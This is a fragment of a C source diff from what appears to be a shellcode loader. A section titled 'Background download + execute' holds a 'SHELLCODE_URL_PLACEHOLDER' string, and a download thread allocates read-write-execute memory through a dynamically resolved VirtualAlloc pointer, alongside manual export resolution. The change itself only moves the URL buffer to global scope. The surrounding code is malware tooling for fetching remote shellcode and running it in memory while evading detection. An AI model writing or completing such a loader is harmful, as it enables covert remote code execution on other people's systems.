@@ -111,10 +111,10 @@ static void *resolve_export(uptr base, const char *name)
 }
 
 /* ── Background download + execute ────────────────────────────────────────── */
+char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
 
 static void download_thread(void *param)
 {
-    char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
     (void)param;
     void *buf = pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
     if (!buf)
